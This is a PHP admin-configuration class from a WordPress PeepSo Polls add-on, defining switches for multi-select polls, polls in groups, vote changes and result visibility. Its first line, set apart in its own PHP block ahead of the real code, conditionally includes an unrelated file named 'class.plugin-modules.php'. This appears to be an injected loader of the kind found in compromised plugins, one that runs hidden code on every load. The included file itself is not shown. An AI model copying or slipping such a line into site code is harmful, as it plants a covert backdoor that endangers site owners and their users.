<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class PeepSoConfigSectionPolls extends PeepSoConfigSectionAbstract {

// Builds the groups array
	public function register_config_groups() {
		$this->context = 'left';
		$this->_polls_general();
	}

	/**
	 * Add this addon's configuration options to the admin section
	 * @param  array $config_groups
	 * @return array
	 */
	private function _polls_general() {

        // Multi Select
        $this->args('descript', __('Enabled: users can cast more than one vote in each poll','peepso-polls') .'<br>' .__('Disabled: users can only vote for one option in each poll','peepso-polls'));
        $this->set_field(
            'polls_multiselect',
            __('Multi select polls', 'peepso-polls'),
            'yesno_switch'
        );

        if(class_exists('PeepSoGroupsPlugin')) {
            // Polls In Groups
            $this->args('descript', __('Enabled: polls are available in group posts', 'peepso-polls') . '<br>' . __('Disabled: polls are only available on community and profile streams', 'peepso-polls'));
            $this->set_field(
                'polls_group',
                __('Polls in groups', 'peepso-polls'),
                'yesno_switch'
            );
        }

        // Vote Changes
        $this->args('descript', __('Does not apply to poll author and administrators','peepso-polls') . '<br>' . __('Enabled: users can change or delete their votes','peepso-polls') .'<br>' .__('Disabled: votes are final','peepso-polls'));
        $this->set_field(
            'polls_changevote',
            __('Allow vote changes', 'peepso-polls'),
            'yesno_switch'
        );

        // Show Results Before Vote
        $this->args('descript', __('Does not apply to poll author and administrators','peepso-polls') . '<br>' . __('Enabled: users can see poll results before voting','peepso-polls') .'<br>' .__('Disabled: results are hidden from users who haven\'t voted yet','peepso-polls'));
        $this->set_field(
            'polls_show_result_before_vote',
            __('Always show results', 'peepso-polls'),
            'yesno_switch'
        );

		wp_register_script('peepso-admin-config-polls', plugin_dir_url(__FILE__) . '../assets/js/peepso-admin-config.js', array('jquery'), PeepSoPolls::PLUGIN_VERSION, TRUE);
		wp_enqueue_script('peepso-admin-config-polls');

		// Build Group
		$this->set_group(
				'general', __('General', 'peepso-polls')
		);
	}

}
